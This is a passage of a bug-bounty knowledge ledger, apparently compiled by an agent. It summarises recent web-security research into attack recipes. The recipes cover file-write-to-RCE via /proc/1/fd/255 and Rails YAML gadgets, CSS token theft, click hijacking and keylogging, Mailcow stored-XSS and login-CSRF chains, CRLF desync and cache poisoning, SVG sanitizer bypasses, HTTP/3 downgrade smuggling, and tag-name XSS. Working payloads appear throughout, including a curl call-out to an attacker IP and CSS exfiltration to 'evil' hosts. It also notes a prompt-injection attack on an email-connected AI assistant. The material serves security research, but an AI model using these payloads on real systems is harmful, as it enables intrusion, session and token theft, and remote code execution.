### [Bugbountyskills.md] 17.201 A SPLIT CREDENTIAL whose missing half parses to `nil` matches every record whose credential COLUMN IS NULL — `<victim_id>-` authenticates as that user (Basecamp Campfire bot keys, HackerOne #3329310) (continued 2/3)

§17.227 — AN ARBITRARY FILE WRITE IS ALSO A READ ORACLE: FINGERPRINT THE TARGET WITH EXISTENCE/errno DIFFERENTIALS, THEN PREFER A DESTINATION THE MACHINE RE-READS BY ITSELF (the running entrypoint's own `/proc/1/fd/255` or `/proc/1/fd/10`, a data file the runtime `unsafe_load`s, or a worker-pool `worker.js` whose path is deterministic) — RCE WITHOUT A REBOOT, A LOGIN OR A daemon (Ethiack, "Write Once, Shell Everywhere: Turning Arbitrary File Writes into RCE", André Baptista @0xacb / Rafael Castilho @Castilho / Bruno Mendes @s3np41k1r1t0, DEF CON 34 August 2026 Bug Bounty Village Creator Stage; read in full this pass — `web_extract` elided ~976 middle chars, the cached complete copy was used; reached from the assigned Bug Bytes #239 feed). THE FORMULA: RCE = path control + content control + a KNOWN-EXECUTED DESTINATION, and the third term is the whole game. THE ORACLE: path resolution stops at the first failing component, so errno leaks that component's existence/type/writability (`ENOENT` missing, `EACCES` exists-not-writable, `EISDIR`/`EEXIST` exists, `ENOTDIR` mid-path is a file, `ELOOP`, `EROFS`, `ENAMETOOLONG`); when the app swallows errno, calibrate RESPONSE SIGNATURES instead (their mapping: 200 = writable, 404 = missing, 403 = locked) and read status/body-length/latency/connection-state differentially — the write still executed, so the exception still steered the app down an observable path. THE FINGERPRINT TREE: `/.dockerenv` (Docker), `/run/.containerenv` (Podman), `/var/run/secrets/kubernetes.io/serviceaccount` (k8s), `/mnt/c` or `/var/task` (WSL/Lambda), `/lib/modules` AND `/run/systemd/system` both absent (STRIPPED CONTAINER — discard the cron/systemd/SSH half of the catalog); distro via `/var/lib/dpkg/status`+`/etc/lsb-release`, musl, `/var/lib/rpm/Packages` vs `rpmdb.sqlite`; version via DIRECTORY NAMES (`/usr/lib/python3.12`, `/usr/lib/php/YYYYMMDD` = the Zend API date → exact PHP minor, `.rbenv/versions/X.Y.Z` = full patch) — six benign probes produced e.g. "Linux · Ubuntu 24.04 · aarch64 · glibc · stripped Docker · Python 3.12". THE SINKS: (1) bash/dash read their own script lazily and relocate the descriptor (bash → fd 255, dash/sh → fd 10); for a container ENTRYPOINT the pid is 1, so `echo '\n\n\nid; curl http://<ip>/$(id -u)' > /proc/1/fd/255` rewrites the program currently running (the newline flood pads the read cursor like a NOP sled — no path needed); (2) Rails `db/schema_cache.yml` is loaded with `YAML.unsafe_load`, so a write becomes a deserialization gadget hunt — their chain declares a `Gem::Requirement` as a YAML hash key so Ruby calls `#hash`, whose `Lockfile#to_s` asks a malicious `Gem::StubSpecification` for its spec and `Gem::Specification.load("/tmp/payload")` evals your Ruby (two writes; the error surfaces AFTER the eval, which is why an error response is not proof of failure); (3) Node worker pools resolve their worker entrypoint from their OWN `__dirname`, making the path deterministic (`piscina/dist/worker.js`, `thread-stream/lib/worker.js`, `tinypool/dist/entry/{worker,process}.js`, `jest-worker/build/{threadChild,processChild}.js`) — overwrite it and wait for the pool to spawn a worker, which it does as normal operation. Catalog also grades `/etc/ld.so.preload` (every new process; a writable `core_pattern` inside a container is a container escape), PHP web root/`.user.ini`/`.htaccess`, .NET/IIS `web.config`/`global.asax`/`bin\*.dll`/`*.aspx`, Java `WEB-INF` (WatchedResource ~10 s, pair a `.class` with a touch of `web.xml`), Bootsnap `tmp/cache/bootsnap`. DETECTION SIGNAL: any write with partial path/content control on a containerised target; write responses that differ by target (the oracle is live); writable `ld.so.preload`, `node_modules`, site directories, Bootsnap cache, web root, `WEB-INF`; a shell-script entrypoint (PID 1 = sh/bash). TRANSFERABLE TEST: calibrate the oracle (writable / missing / locked), probe the fingerprint set, then try `/proc/1/fd/255` and `/proc/1/fd/10` on a shell-script entrypoint, the `schema_cache.yml` gadget on Rails, or the deterministic worker path on Node. WHY IT IS A NEW GENERAL METHOD: `ld.so.preload`, `schema_cache`, `bootsnap`, `worker.js`, `Piscina`, `core_pattern`, `user.ini`, `errno`, `ENAMETOOLONG`, `ENOTDIR`, `Ethiack`, `Write Once`, `Shell Everywhere`, `StubSpecification`, `0xacb` = 0 hits; the AFW→RCE class, its persistence paths (`Startup`, `~/.zshenv`, `authorized_keys` — §17.222 and the earlier file-write material) and the Python `.pth`/`sitecustomize` sink (line 10249) are pre-recorded and NOT re-recorded — new here is the oracle, the fingerprint tree and the three cloud-native sinks. Rule: **an arbitrary file write is a read primitive as much as a write — profile the target with existence/errno differentials before spending a destructive request, and prefer destinations the machine re-reads on its own: the running entrypoint's own file descriptor, a data file the runtime unsafe-loads, or the next worker the pool spawns.** Slot 17.227. UNVERIFIED (not reproduced) — no payload was written anywhere this pass.

§17.228 — UNTRUSTED CSS RENDERED IN A TRUSTED ORIGIN: THE ALWAYS-AVAILABLE IMPACTS ARE (a) LEAKING ANY SHORT TOKEN IN AN ATTRIBUTE OR TEXT NODE VIA NESTED ATTRIBUTE SELECTORS / A FONT-HEIGHT ORACLE, (b) HIJACKING CLICKS WITH `:before`/`:after` (THEY INHERIT THE ELEMENT'S HANDLERS) AND `label[for]`, AND (c) READING BACK MUTATED CSS — SO TEST THE SANITIZER BY MUTATION (PortSwigger, "CSS: the bomb inside your inbox", @garethheyes, published 2026-08-06, updated 2026-08-13; read in full this pass — `web_extract` elided ~10,626 middle chars, recovered from the cached 50,072-char page; reached from the assigned Bug Bytes #239 feed; two Fastmail CSSOM-mutation bugs paid $1,000 each). THE TECHNIQUES: (1) PROBE — paste `<style>*{color:red}</style>` as HTML (Hackvertor "Copy as HTML") into a `contenteditable` field; a red flash means CSS survived a race, and Firefox is the best target (keeps inline styles, makes background requests). (2) EXTERNAL REQUESTS to beat an image proxy: `background:image-set(var(--x,'//attacker'))` (the literal URL is stripped, the undefined-variable fallback fires), `@import` variants, the comment vector `/*# sourceMappingURL=https://<you> */`, unclosed parens, comments inside `url()`, and hex escapes between slashes (`url(/\5c/<host>/…)`, `url(/\D/evil)`) so the sanitizer sees a relative URL and the browser an external host. (3) TOKEN THEFT — nest `[attr^="prefix"] { &[attr*="…"] { background:url("//evil/?start=…") } }` to leak a 12-char hex token ~5 chars from the start and ~5 from the end plus overlapping "contains-anywhere" chunks (server-side you recover the middle 2 by comparing the chunks against a 1-char slice); short custom properties (`--s`/`--e`) keep the CSS small; works for any 12-char hex token, and Yahoo/AOL Mail share the paste race. (4) NO EXTERNAL REQUESTS (CSP blocks): a FONT-HEIGHT ORACLE for a numeric code — one `@font-face` per digit with `unicode-range:U+003N` and `descent-override:200%`, an `@keyframes` assigning the matching family (with a plain-family gap frame), `--c: calc(round((var(--h) - 108) / 28))` to count each digit, then `a{inset:max(var(--zero1,100%), …)}` so the one correct link is fullscreen (0%, a click anywhere exfiltrates) and all others are offscreen (100%). (5) SANITIZER BYPASS BY MUTATION — the CSSOM decodes escapes on read-back, so `@keyframes foo\7d\2a` becomes `@keyframes foo } *` and an `@media` name mutated through `mediaText` becomes `@scope{@media screen}*{…}`; methodology Probe → Inspect → Transform → Exploit. (6) CSS HOTWIRING — `:before`/`:after` inherit the click events, so `.action:before{position:fixed;width:100%;height:100%;content:" ";z-index:10000000}` makes a click anywhere perform the chosen UI action (the `content` property is mandatory; stack steps with z-index); `label[for="<element id>"]` activates any id'd control (worked on Outlook, unfixed; enumerate with `document.querySelectorAll('input[id],button[id],select[id],textarea[id]')`). (7) CSS GADGET — the sanitizer allow-lists custom `data-*` attributes and a library later appends DOM using those values with CSS outside the allow list (`position:fixed`); wrap it and override with `!important` to break out of the message window, then a real keylogger: `option+option:checked{background:url(…?steal=a)}` (adjacent-sibling combinator bypasses a blocked `:checked`-with-class), `select{appearance:none;-webkit-text-security:disc}`, and the Firefox quirk that moving the select offscreen resets the ~1 s option timer (`@keyframes focusTrick{from{left:-5000px}to{left:0}}`) — all surviving DOMPurify + the CSS allow list. (8) CHAIN — the Gmail `image-set` proxy bypass plus indirect prompt injection against a Gmail-connected AI assistant exfiltrated a Slack token from a generated draft. DETECTION SIGNAL: untrusted HTML+CSS rendered in a trusted origin; an image proxy that base64s your URL; a filter that re-serialises the CSSOM; allow-listed `data-*` attributes driving DOM+CSS; `:before/:after` or `label[for]` reachable from message HTML; a short token in an attribute or a numeric code in a text node. TRANSFERABLE TEST: paste-probe for unsanitised CSS; try `image-set(var(--x,'//you'))`, a `sourceMappingURL` CSS comment, `url(/\5c/…)`; leak a short hex token with nested attribute selectors or a numeric code with the `unicode-range`/`inset` method; feed `@keyframes x\7d\2a{color:red}` and read the serialised CSS back for mutation; hijack clicks with `:before` and activate controls with `label[for]`. WHY IT IS A NEW GENERAL METHOD: `CSS hotwiring`, `hotwiring`, `attribute selector`, `font-height`, `descent-override`, `unicode-range`, `image-set`, `CSS gadget`, `defanged`, `CSSOM`, `keylogger`, `Gareth Heyes`, `label for=` = 0 hits across all three write targets; `sourceMappingURL` (10 hits) is recorded only as source-map LEAKAGE (fetching `.js.map`), a different surface from a CSS-comment beacon. Rule: **wherever untrusted CSS is rendered in a trusted origin the always-available impacts are leaking any short token in an attribute or text node (nested attribute selectors / font-height oracle), hijacking clicks via `:before`/`:after` and `label[for]`, and reading back MUTATED CSS — test the sanitizer by mutation (escapes decoded on re-serialisation) and never trust a proxy that merely base64s your URL.** Slot 17.228. UNVERIFIED (not reproduced) — no webmail client or lab was stood up this pass.

§17.229 — THE CHEAPEST UNAUTHENTICATED→ADMIN PATH IS AN INPUT THAT ONLY AN ADMIN EVER SEES (a log, a quarantine queue, a login history), AND A SELF-XSS ESCALATES TO DATA THEFT VIA LOGIN CSRF PLUS `window.opener` ON THE VICTIM'S STILL-OPEN SESSION (Mailcow; CVE-2026-40872 Autodiscover log, CVE-2026-40873 quarantine filename, CVE-2026-40875 login-history IP escalated via login CSRF; CVSS v4.0 8.9/8.9/7.0; fixed in mailcow 2026-03b, 2026-03-31; Aikido, @J0R1AN, published 2026-04-17, updated 2026-06-06; read in full this pass via `web_extract`, 16,541 chars; reached from the assigned Bug Bytes #239 feed). THE THREE BUGS: (1) the admin Autodiscover log is rendered by DataTables, which "interprets any data values as HTML by default", and while `item.ua` is passed through `escapeHtml`, `item.name` (the email address) is NOT — Autodiscover is unauthenticated by design and the address is unvalidated, so `POST /Autodiscover/Autodiscover.xml` with `<EMailAddress>&lt;img src=x onerror=alert(origin)&gt;</EMailAddress>` stores XSS that fires when an admin opens Dashboard → Logs → Autodiscover (mailbox read + instance reconfiguration). (2) Quarantine attachment FILENAMES are concatenated unescaped into HTML; the delivery problem is solved with EICAR — attach a file whose BODY is the standard EICAR signature and whose Content-Disposition filename is the payload, so every AV quarantines the mail without the attacker sending real malware and the admin's "Show item" renders it. (3) the Login-History table renders `real_rip` unescaped and the "IP" comes from the `X-Real-IP` header by default with no validation, so `X-Real-Ip: "><img src onerror=alert(origin)>` stores a payload under YOUR OWN account (self-XSS) — escalated because the login POST has NO CSRF protection: a page you host auto-submits YOUR credentials to log the victim into YOUR account, then redirects to `/user` where the stored XSS fires; keep the victim's real mailbox open in tab 1 and use `window.opener` from the injected tab to read `document.body.innerHTML` from it — the victim's still-authenticated mailbox — two clicks for their email, then password-reset flows pivot to connected accounts. DETECTION SIGNAL: an admin/log page that renders attacker-influenced strings (email, filename, User-Agent, IP) via `innerHTML`/DataTables/jQuery `.append()` unescaped — check each column, one is often missed while its neighbour is escaped; an unauthenticated endpoint that writes into a surface an admin views (Autodiscover, mail/attachment handling, a "logs" menu); an AV/quarantine queue poppable with an EICAR-bodied attachment; an unvalidated `X-Real-IP`/`X-Forwarded-For` stored then rendered; a login POST with no CSRF token. TRANSFERABLE TEST: inject through an unauthenticated field that lands in an admin-read log; use an EICAR attachment to reach a quarantine queue; for a sink that only shows to you, pair it with login CSRF and read the victim's still-open tab via `window.opener`. WHY IT IS A NEW GENERAL METHOD: `mailcow`, `Autodiscover`, `DataTables`, `EICAR`, `40872`, `40873`, `40875`, `FreddleSpl0it` = 0 hits across all three write targets; `login CSRF` (10 hits) is recorded only in the OAuth/`state`/session-fixation context (V-17) and nothing records a self-XSS→login-CSRF→`opener` chain; `X-Real-IP` hits are proxy-header recon and (batch 67) an identity-from-a-header test — a different SINK from a stored-XSS render; `opener` hits are `Cross-Origin-Opener-Policy` material. Rule: **enumerate every column/field an admin UI renders and assume one is unescaped when its neighbour is — the cheapest unauthenticated→admin path is an input that is only ever displayed to an admin (a log, a quarantine queue, a login history); and when a payload only shows to you, escalate with login CSRF (the victim logged into your account) plus `window.opener` to read their still-open session.** Slot 17.229. UNVERIFIED (not reproduced) — no Mailcow instance was stood up this pass.

§17.230 — A HEADER-INJECTION FLAG IS THE FIRST LINK, NOT THE FINDING: LOCATE THE INJECTION UPSTREAM (A `Host`-PROBE), PROVE THE SPLIT WITH BOGUS-VERSION/VERB PREFIXES, FIND AN OPEN-REDIRECT GADGET, AND CHAIN CACHE POISONING FOR FULL-SITE TAKEOVER (PortSwigger, "Making HTTP header injection critical with one prompt", 4 November 2026; read in full this pass via `web_extract`, no elision; Burp AT skill distilling the CRLF-Powered Desync methodology). THE FOUR PHASES: (1) IDENTIFY THE UPSTREAM INJECTION LOCATION — a path insertion point is often REWRITTEN into a custom header upstream, and what matters is whether that custom header sits before or after the upstream `Host`; probe `GET /%0d%0a%0d%0a HTTP/1.1` (normal status) vs `GET /%0d%0aHost:%20x%0d%0a%0d%0a HTTP/1.1` (400), whose upstream form is `GET / HTTP/1.1  Host: example.com  X-Original-path: /  Host: x` — proving the injection is inside a custom header AFTER the upstream Host. (2) VALIDATE THE DESYNC VIA REQUEST SPLITTING — smuggle a second request line with a bogus version/verb so a split yields a distinctive status: `GET /%0d%0a%0d%0aGET%20/%20HTTP/13.37%0d%0aHost:%20example.com %0d%0aContent-Length:%20150%0d%0a%0d%0a HTTP/1.1` (and the `TRACE` variant); fuzz several prefixes — 2-3 DISTINCT status codes prove the prefixes are modifying requests upstream. (3) FIND AN EXPLOIT GADGET — mini-crawl for an open redirect inducible via `Host`, `X-Forwarded-Host` or an absolute URL. (4) EXPLOIT — combine phase 2 and phase 3 (e.g. `/assets` redirects to `/assets/` using the host header ⇒ `GET /%0d%0a%0d%0aGET%20/assets%20HTTP/1.1%0d%0aHost:%20collaborator.net%0d%0a Content-Length:%20150%0d%0a%0d%0a HTTP/1.1` sent repeatedly over different connections serves the collaborator redirect to OTHER users on the shared stream), which is the primitive for full-site takeover chained with cache poisoning; the article deliberately avoided Response Queue Poisoning as "so dangerous". FALLBACK — if phase 2 shows no full desync, blind request tunnelling may find an access-control bypass. DETECTION SIGNAL: `%0d%0a` surviving upstream; a 400 when you add a second `Host`; distinct status codes across prefix permutations; an open redirect keyed on Host/X-Forwarded-Host/absolute URL. TRANSFERABLE TEST: on any header/CRLF injection, classify where it lands (add `Host: x`, watch for 400), split with a bogus-version/verb prefix, fuzz prefixes for distinct status codes, find the redirect gadget, then combine and re-send across connections; if no desync, try request tunnelling for an ACL bypass. WHY IT IS A NEW GENERAL METHOD: `CRLF-Powered`, `request splitting`, `X-Original-path`, `Response Queue Poisoning` = 0 hits across all three write targets; the CRLF-injection→header-injection→request-smuggling CLASS is already recorded (the edge rule-engine entries around ledger lines 3405/4645/4653), so this slot records only the new ESCALATION METHODOLOGY. Rule: **spend the header injection on a desync, not on a write-up — locate the injection upstream with a Host-probe, prove the split with bogus-version/verb prefixes, and convert it through an open-redirect gadget plus a cache into random-user impact and site takeover; when a full desync is impossible, request tunnelling is the ACL-bypass fallback.** Slot 17.230. UNVERIFIED (not reproduced) — no Burp AT session or desync-capable target was used this pass.

§17.231 — AN SVG SANITIZER IS A PARSER-DIFFERENTIAL PROBLEM, NOT A FILTER: TEST NAMESPACE SWITCHING ON ONE ELEMENT, THE LIBRARY'S ELEMENT-LOOKUP CASE, `<animate>`/`<animateTransform>` HREF, A SELF-CONTAINED `data:` XSLT STYLESHEET, SAFARI'S `<use>`-IMPORTS-IMAGE BEHAVIOUR, AND A `Link:` RESPONSE HEADER THAT RUNS SCRIPT IN FIREFOX WITH A HARMLESS XML BODY (PortSwigger, "Scalable Vector Grief", 27 October 2026, @garethheyes; read in full this pass via `web_extract`; the author tested eight popular SVG sanitizers and bypassed six). THE BYPASSES: (1) NAMESPACE CONFUSION — you do not need `<foreignObject>`: switch the XML namespace on a SINGLE element to XHTML and the browser renders it as HTML inside the SVG — `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><frame xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(document.domain)"/></svg>`, and the same with `<iframe … srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"/>`; also a nested `<svg onload="alert(1)"/>`. (2) CASE-SENSITIVE LOOKUP — the SVG parser camelCases the element to `foreignObject`, so a sanitizer that hunts with `querySelectorAll('foreignobject')` finds nothing: `<foreignobject><img src=x onerror=alert(1)></foreignobject>`. (3) ANIMATE-TO-JAVASCRIPT-URL — `<a><animate attributeName="href" values="JavaScript:alert(1)"/><text …>XSS</text></a>`, plus Kevin Mizu's `<animateTransform attributeName="href" type="invalid" values="XXX;javascript:alert(1)//" begin="0s" dur="0.1s" fill="freeze">` in Safari. (4) SELF-CONTAINED XSLT — point `<?xml-stylesheet type="text/xsl" href="data:text/xsl;base64,…"?>` at a data URL whose stylesheet matches `/` and outputs HTML, building the script tag from split parts (`<x:element name="{concat('scr','ipt')}">alert(document.domain)</x:element>`) so the code runs in the DOCUMENT's origin; no separate file needed (feature deprecated, due for removal November 2026). (5) RESPONSE-HEADER → XSS — Firefox loads stylesheets from a `Link` response header and data URLs work there, so `header('Link: <data%3Aapplication%2Fxml%2C…>; rel="stylesheet"; type="text/xsl"')` executes a two-layer URL-encoded XSLT (outer stylesheet + XSLT `document()` loading a second data URL whose XHTML `<img onerror=…>` is copied into a `<foreignObject>`) while the response BODY is completely harmless XML (`<x><b>foo</b></x>`). (6) SAFARI IMPORTS IMAGES AS SVG — `<use href="test.png#x"/>` imports a file whose bytes are SVG/XML (`<g id="x"><image href="1" onerror="alert(1)"/></g>`); a true SVG/image polyglot is impossible, but a GIF carrying the payload does not render when opened yet IS still imported with `<use href="/svg/test.gif#x"/>`. NEGATIVE RESULT: DOMPurify and darylldoyle/svg-sanitizer held up against everything. DETECTION SIGNAL: an SVG/image upload that runs a sanitizer; a case-sensitive element lookup; an allow-listed `<animate>`/`<animateTransform>`; an accepted `<?xml-stylesheet?>` PI; a response whose headers you influence but whose body is XML; Safari clients. TRANSFERABLE TEST: (a) flip the namespace on one element; (b) send lowercase `<foreignobject>`; (c) try the animate/animateTransform href; (d) try the self-contained `data:` XSLT; (e) return harmless XML with a `Link: <data:…>; rel="stylesheet"; type="text/xsl"` header and open it in Firefox; (f) on Safari upload a payload GIF and `<use href="…#id">` it. WHY IT IS A NEW GENERAL METHOD: `xml-stylesheet`, `animateTransform`, `svg-hush`, `svg-sanitizer`, `alnorris`, `Borewit` = 0 hits; `namespace confusion` 0/1 and `foreignObject` 0/1; the GENERIC SVG-XSS vector list IS already recorded (playbook line 13883) and is deliberately NOT re-recorded — new is the sanitizer-bypass family and the two negatives. Rule: **an SVG sanitizer is bypassed by the difference between how the browser and the library parse the document — namespace switch on one element, camelCase lookup, the animate href, a self-contained `data:` XSLT, Safari's `<use>`-imports-image, and a `Link` header that runs script in Firefox while the body stays inert XML.** Slot 17.231. UNVERIFIED (not reproduced) — no SVG sanitizer library or browser lab was stood up this pass.

§17.232 — A TOKEN IS A ROUTE THROUGH OVERLAPPING FRAGMENTS: LEAK UNORDERED n-GRAMS, SCALE THE CHUNK SIZE DOWN AS THE ALPHABET GROWS, STITCH BY OVERLAP AGAINST THE KNOWN START/END, AND COUNT EVERY CANDIDATE — ONE STYLESHEET RECOVERS TOKENS HUNDREDS OF CHARACTERS LONG WITHOUT RECURSIVE IMPORTS (PortSwigger, "Smashing the token limit with overlapping fragments", Alex Craig @Alex_______C with Gareth Heyes, 5 October 2026, updated 28 October 2026; read in full this pass via `web_extract`). THE METHOD: (1) Gareth's CSS reports WHICH short chunks appear in a link but not WHERE — that is enough: `c2e`, `2e1`, `e16`, `16a` overlap two characters each, so draw each as a graph arrow (`c2e` = `c2→2e`) and follow the arrows to rebuild the token char by char, using the separately-reported start and end to fix the route's ends. (2) The reconstruction script must COUNT EVERY token that fits the reported start/end and known length (a chunk appearing twice is reported once, and chunks from different places can join) — never stop at the first plausible one. (3) Make checks cheap by grouping joins on the join's MIDDLE character: `0`–`d` take the stronger three-character check, `e`/`f` the cheaper two-character check, so only 14 of 16 groups need 3-char rules (3-char = 4,096 rules, 4-char = 65,536). (4) Proven 12-char sizes: 99%-one-guess = 1.33 MB / 25,088 selectors; 90%-≤5-guesses = 223 KB / 4,128 selectors; Gareth's original needed 257.69 MB for the same 12 chars (≈1,150×/193× smaller). (5) With Gareth's byte budget (257,691,933) check EVERY five-character chunk (1,048,576 selectors) plus sparse six-character checks beginning a/b/c/d: 4,268,032 selectors / 257,029,661 bytes → a 210-character token at 99% one-guess (29,753/30,000) and a 640-character token at 90% ≤5 guesses (27,158/30,000). (6) SCALE CHUNK SIZE TO THE ALPHABET: the Burp AT lab with a hidden 44-char upper+lower+digit token (62 characters) would need 238,328 rules for 3-char chunks, so the skill SWITCHED to two-character chunks (3,844 chunks) and rewrote CSS + stitching script. Harness note: generate a new token each run plus new values for the URL's existing hex characters, and record each chunk once with no position. DETECTION SIGNAL: a CSS-injection sink rendering a secret longer than ~12 characters (session id, CSRF token, API key, reset token) into a selectable attribute/text node. TRANSFERABLE TEST: leak unordered overlapping n-grams (3-char for hex, 2-char for 62-symbol alphanumerics), add sparse (n+1)-char checks grouped by first character, reconstruct by overlap-graph search against the reported start/end/length, and require ≤1 (≤5) candidates counting ALL of them. WHY IT IS A NEW GENERAL METHOD: `overlapping fragments`, `token limit`, `Alex Craig`, `race-http3` = 0 hits; §17.228 records the CSS-in-bomb 12-char nested-attribute-selector/font-height theft, which this DISTINCT extension supersedes for long tokens; imports are no longer the reason to write off a CSS injection. Rule: **do not brute-force a long CSS-reachable secret and do not reach for recursive imports — leak short overlapping n-grams, keep the chunk length small enough for the alphabet, stitch by overlap against the known start/end, and one stylesheet recovers tokens of hundreds of characters.** Slot 17.232. UNVERIFIED (not reproduced) — no stylesheet was generated and no lab was attacked this pass.

§17.233 — WHEN A TARGET SPEAKS HTTP/3 BUT ITS ORIGIN SPEAKS HTTP/1, THE DOWNGRADE BOUNDARY IS THE BUG: A KETTLED HTTP/3 REQUEST WITH A `^~` ESCAPE INJECTS `Transfer-Encoding: chunked` AFTER THE DOWNGRADE, PSEUDO-HEADER OVERRIDES REACH INTERNAL HOSTS, AND THE SINGLE-DATAGRAM / QPACK-BLOCKED-STREAMS GROUPINGS SHRINK RACE WINDOWS BEYOND THE SINGLE-PACKET ATTACK (PortSwigger, "HTTP/3 in Burp Suite — it's time to find a bigger wordlist", Tom Stacey @t0xodile, 23 September 2026; read in full this pass — `web_extract` truncated the body, recovered with `curl` + desktop UA + local strip). THE TECHNIQUES: (1) REACH HTTP/3-ONLY SURFACE — the HTTP/3 Adapter extension converts HTTP/1.1/HTTP/2 to HTTP/3 and back, so sites that only speak HTTP/3 become testable; "Explicit HTTP/3 only" mode sends over HTTP/3 only requests carrying `X-Http3: 1`, "Always HTTP/3 where possible" tries HTTP/3 first. (2) HTTP/3 RACE groupings (built into the gate system; `gateMode` forces one, auto-selected and QPACK used only if the server supports it): the Single Datagram Attack (QUIC-er Races) and Server-Side Race Orchestration via QPACK Blocked Streams (Chaos by Design) give better groupings than the single-packet attack when the target supports HTTP/3, so you hit smaller TOCTOU windows — `RequestEngine(engine=Engine.HTTP3, gateMode='auto')`, queue with `gate='race1'`, `engine.openGate('race1')`. (3) HTTP/3 DOWNGRADE HEADER INJECTION — kettled requests (`engine.queue(target.req, kettled=True)`) imply `:path`/`:method` from the HTTP/1-style request line and `:authority`/`:scheme` from the target, but pseudo-headers can be OVERRIDDEN (`:scheme: httpx`, `:authority: intranet.example.com`); binary specials use escapes CRLF `^~`, space `^s`, null `^0`, CR `^r`, LF `^n`, any hex `^x02`, literal `^` `^^`; the weaponised payload `GET / HTTP/1.1` / `foo: bar^~Transfer-Encoding:^schunked` queued kettled injects a `Transfer-Encoding: chunked` header ONCE the target downgrades HTTP/3→HTTP/1 (`foo: bar` then `Transfer-Encoding: chunked` on the downgraded leg). For a desync, use the `BURP` engine (HTTP/1.1, connection reuse disabled), not `AUTO`; minimise requests/responses (HEAD or `Range: bytes=-1` → `206`), and note `Host` can be skipped on the HTTP3 engine (`:authority` implied). DETECTION SIGNAL: `Alt-Svc: h3` with a front-end that speaks HTTP/1 to the origin (the downgrade boundary); H3-only paths (probe `X-Http3: 1`); a state-changing endpoint needing a tight race window. TRANSFERABLE TEST: with `Alt-Svc: h3`, (a) send a kettled request with `foo: bar^~Transfer-Encoding:^schunked` and confirm the `Transfer-Encoding: chunked` appears after the downgrade; (b) override `:authority`/`:scheme` to an internal host; (c) group the request N times with the HTTP/3 gate and compare against single-packet; (d) probe `X-Http3: 1`-only endpoints. WHY IT IS A NEW GENERAL METHOD: `HTTP/3 downgrad`, `kettled`, `QPACK`, `X-Http3`, `Single Datagram`, `race-http3` = 0 hits; `QUIC`/`HTTP/2` hits are unrelated; the smuggling CLASS and the CRLF→smuggling family are pre-recorded, so this slot records the HTTP/3-SPECIFIC mechanisms only (and excludes the tool-release preamble). Rule: **test the protocol the target actually serves — when HTTP/3 is downgraded to HTTP/1 at the origin, a kettled HTTP/3 request with a `^~` escape smuggles a framing header onto the HTTP/1 leg, pseudo-header overrides reach internal hosts, and the HTTP/3 datagram/QPACK groupings beat single-packet on race windows.** Slot 17.233. UNVERIFIED (not reproduced) — Turbo Intruder / the HTTP/3 Adapter were not installed and no HTTP/3 target was tested this pass.

§17.234 — A TAG NAME IS NOT INERT DATA: THE BROWSER LOWERCASES IT INTO `localName` AND HANDS IT BACK THROUGH ORDINARY DOM PROPERTIES (`attributes[0].value`, `part`, `classList`, `getAttributeNode`, `setHTMLUnsafe`), SO AN HTML-INJECTION SINK WITH A BLOCKLIST IS BYPASSABLE BY WRITING THE JAVASCRIPT INTO THE TAG NAME (PortSwigger, "What's in a tag name? JavaScript, apparently", @garethheyes, 25 August 2026; read in full this pass — `web_extract` truncated the body, recovered with `curl` + desktop UA + local strip). THE METHOD: (1) tag names must start with `a-zA-Z` but many characters are allowed after, and the browser UPPERCASES the name — however the DOM property `localName` (found via `console.dir(x)` on an element with an `id`) holds it in LOWERCASE, which is the payload source. (2) Make the element focusable with `tabindex` (+ `autofocus`) and CHAIN `onfocus` WITH ITSELF, writing a string that is compiled into a function and invoked with `new`: `<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>` — the author says it "works in every browser" and "is a pretty nice way to bypass a WAF". (3) Uppercase JS works too: `<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>`. (4) Transformation fuzz: alphabetic characters, forward slashes, whitespace and newlines ARE transformed in a tag name; line/paragraph separators are NOT (they act as JS newlines) → `<null alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>`. (5) If `attributes[0].value` is filtered: `attributes[0].textContent=localName` or `attributes[0].nodeValue=localName` (still `new onfocus`). (6) An opening angle bracket can be part of the tag name: `<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>`. (7) `part` converts space-separated values into an ARRAY: `<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>`. (8) Variants: `contenteditable` instead of `tabindex`; `getAttributeNode('onfocus').value=localName,onfocus()`; `setHTMLUnsafe(localName+title)`; and the `classList` form of the part vector. DETECTION SIGNAL: an HTML-injection sink that echoes an attacker-chosen tag name/attribute, or a sanitizer/WAF that uppercases, strips or blocklists the obvious `<script>`/`onerror=`/`alert(` patterns — the browser is more lenient than the filter assumes. TRANSFERABLE TEST: try `<PAYLOAD onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>` (lowercase JS reclaimed via `localName`), then the `location=localName`, `textContent`, `nodeValue`, `getAttributeNode`, `part=`/`classList` eval, `setHTMLUnsafe` and `contenteditable` variants. WHY IT IS A NEW GENERAL METHOD: `localName`, `getAttributeNode`, `setHTMLUnsafe`, `classList`, `part=` = 0 hits; `tag name` (1/2) is unrelated (a markdown autolinker entry and a WAF comment-splitting table row); `onfocus`/`contenteditable` hits are generic. Rule: **a tag name is not inert — the browser lowercases it into `localName` and hands it back through ordinary DOM properties, so an HTML-injection sink with a blocklist is bypassable by writing the JavaScript into the tag name and letting `attributes[0].value` / `part` / `classList` turn it into a function.** Slot 17.234. UNVERIFIED (not reproduced) — no browser/WAF lab was stood up this pass.

